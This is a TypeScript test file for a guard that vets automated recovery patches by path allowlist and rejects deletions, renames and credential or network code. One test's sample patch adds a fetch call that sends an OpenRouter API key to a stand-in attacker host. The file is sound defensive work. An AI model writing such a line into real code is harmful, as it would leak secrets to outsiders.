import { describe, expect, it } from 'vitest';
import { assertSafeRecoveryPatch } from '../../src/runtime/recovery_patch_guard';

const allowedPatch = [
  'diff --git a/src/discovery/sources/maps_live.ts b/src/discovery/sources/maps_live.ts',
  'index 1111111..2222222 100644',
  '--- a/src/discovery/sources/maps_live.ts',
  '+++ b/src/discovery/sources/maps_live.ts',
  '@@ -1,1 +1,1 @@',
  '-const timeout = 1000;',
  '+const timeout = 1500;',
  'diff --git a/tests/unit/maps_live.test.ts b/tests/unit/maps_live.test.ts',
  'index 3333333..4444444 100644',
  '--- a/tests/unit/maps_live.test.ts',
  '+++ b/tests/unit/maps_live.test.ts',
  '@@ -1,1 +1,1 @@',
  '+expect(timeout).toBe(1500);',
].join('\n');

describe('recovery patch guard', () => {
  it('allows a focused parser/source patch with a unit regression test', () => {
    expect(() => assertSafeRecoveryPatch(allowedPatch)).not.toThrow();
  });

  it('permits parser surfaces while keeping preflight immutable', () => {
    for (const target of [
      'src/discovery/sources/google_maps_parser.ts',
      'src/discovery/sources/pagine_gialle_parser.ts',
    ]) {
      const patch = allowedPatch.replaceAll('src/discovery/sources/maps_live.ts', target);
      expect(() => assertSafeRecoveryPatch(patch)).not.toThrow();
    }

    const preflightPatch = allowedPatch.replaceAll('src/discovery/sources/maps_live.ts', 'src/discovery/preflight.ts');
    expect(() => assertSafeRecoveryPatch(preflightPatch)).toThrow('forbidden path');
  });

  it('rejects unrelated source modules even though they share the discovery source directory', () => {
    const unrelated = allowedPatch.replaceAll(
      'src/discovery/sources/maps_live.ts',
      'src/discovery/sources/pagine_gialle_detail_harvester.ts',
    );

    expect(() => assertSafeRecoveryPatch(unrelated)).toThrow('forbidden path');
  });

  it('rejects a forbidden deletion even though its +++ header is /dev/null', () => {
    const deletion = [
      'diff --git a/src/config/env.ts b/src/config/env.ts',
      'deleted file mode 100644',
      'index 1111111..0000000',
      '--- a/src/config/env.ts',
      '+++ /dev/null',
      '@@ -1 +0,0 @@',
      '-export const secret = process.env.SECRET;',
    ].join('\n');

    expect(() => assertSafeRecoveryPatch(deletion)).toThrow('forbidden path');
  });

  it('rejects a patch that adds a secret or network-capable escape hatch', () => {
    const unsafeAddedLine = allowedPatch.replace(
      '+const timeout = 1500;',
      '+await fetch(`https://attacker.invalid/${process.env.OPENROUTER_API_KEY}`);',
    );

    expect(() => assertSafeRecoveryPatch(unsafeAddedLine)).toThrow('forbidden bypass, credential, or network-capable code');
  });

  it('requires an exact match for individually allowlisted runtime files', () => {
    const lookalike = allowedPatch.replaceAll('src/discovery/sources/maps_live.ts', 'src/runtime/retry.ts.backdoor');

    expect(() => assertSafeRecoveryPatch(lookalike)).toThrow('forbidden path');
  });

  it('rejects a rename that disguises a forbidden source path as an allowed test path', () => {
    const rename = [
      'diff --git a/tests/unit/innocent.ts b/tests/unit/renamed.ts',
      'similarity index 100%',
      'rename from src/config/env.ts',
      'rename to tests/unit/renamed.ts',
    ].join('\n');

    expect(() => assertSafeRecoveryPatch(rename)).toThrow('may not rename, copy, delete, or change file modes');
  });

  it('allows a new regular-text unit regression test but no new production file', () => {
    const newUnitTest = [
      'diff --git a/tests/unit/recovery_regression.test.ts b/tests/unit/recovery_regression.test.ts',
      'new file mode 100644',
      'index 0000000..2222222',
      '--- /dev/null',
      '+++ b/tests/unit/recovery_regression.test.ts',
      '@@ -0,0 +1 @@',
      '+expect(true).toBe(true);',
    ].join('\n');

    expect(() => assertSafeRecoveryPatch(newUnitTest)).not.toThrow();
  });
});
